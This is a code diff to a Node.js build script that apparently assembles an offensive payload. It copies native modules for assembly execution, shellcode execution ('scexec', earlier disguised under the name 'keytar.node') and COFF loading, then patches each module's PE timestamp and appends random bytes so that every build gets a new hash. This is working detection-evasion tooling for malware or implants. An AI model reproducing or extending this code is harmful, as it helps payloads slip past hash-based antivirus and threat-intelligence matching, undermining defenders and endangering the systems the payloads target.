@@ -83,8 +83,10 @@ const pkgSrcPath                = path.join(sourceDir, 'package.json');
 const pkgDstPath                = path.join(outputDir, 'package.json');
 const AssemblySrcPath           = path.join(sourceDir, 'assembly.node');
 const AssemblyDstPath           = path.join(outputDir, 'assembly.node');
-const scexecSrcPath             = path.join(sourceDir, 'keytar.node');
-const scexecDstPath             = path.join(outputDir, 'keytar.node');
+const scexecSrcPath             = path.join(sourceDir, 'scexec.node');
+const scexecDstPath             = path.join(outputDir, 'scexec.node');
+const CoffLoaderSrcPath         = path.join(sourceDir, 'CoffLoader.node');
+const CoffLoaderDstPath         = path.join(outputDir, 'CoffLoader.node');
 const cleanupTargets            = [
     path.join(__dirname, 'node_modules'),
     path.join(__dirname, 'package.json'),
@@ -140,6 +142,7 @@ async function changeNodeHashes() {
     // Load original PE binaries
     const assembly_buffer   = fs.readFileSync(AssemblySrcPath);
     const scexec_buffer     = fs.readFileSync(scexecSrcPath);
+    const coffldr_buffer    = fs.readFileSync(CoffLoaderSrcPath);
 
     // ----------- Assembly PE Modification -----------
     const assembly_peOffset         = assembly_buffer.readUInt32LE(0x3C);
@@ -166,10 +169,25 @@ async function changeNodeHashes() {
     const scexec_newBuffer = Buffer.concat([scexec_buffer, scexec_junk]);
 
     fs.writeFileSync(scexecDstPath, scexec_newBuffer);
+
+    // ----------- COFF Loader PE Modification -----------
+    const coffldr_peOffset         = coffldr_buffer.readUInt32LE(0x3C);
+    const coffldr_timestampOffset  = coffldr_peOffset + 8;
+    const coffldr_randomTime       = Math.floor(Date.now() / 1000) - Math.floor(Math.random() * 100000);
+
+    coffldr_buffer.writeUInt32LE(coffldr_randomTime, coffldr_timestampOffset);
+    // console.log('[+] Patched PE timestamp (coffldr):', new Date(coffldr_randomTime * 1000).toUTCString());
+
+    const coffldr_junk     = crypto.randomBytes(128);
+    const coffldr_newBuffer = Buffer.concat([coffldr_buffer, coffldr_junk]);
+
+    fs.writeFileSync(CoffLoaderDstPath, coffldr_newBuffer);
+
     // console.log(`- Original assembly.node hash : ${hashFile(AssemblySrcPath)}`);
-    // console.log(`- Original keytar.node   hash : ${hashFile(scexecSrcPath)}`);
-    console.log(`\t- Payload assembly.node hash : ${hashFile(AssemblyDstPath)}`);
-    console.log(`\t- Payload keytar.node   hash : ${hashFile(scexecDstPath)}`);
+    // console.log(`- Original scexec.node   hash : ${hashFile(scexecSrcPath)}`);
+    console.log(`\t- Payload assembly.node   hash : ${hashFile(AssemblyDstPath)}`);
+    console.log(`\t- Payload scexec.node     hash : ${hashFile(scexecDstPath)}`);
+    console.log(`\t- Payload COFFLoader.node hash : ${hashFile(CoffLoaderDstPath)}`);
 }
 
 function cleanup() {
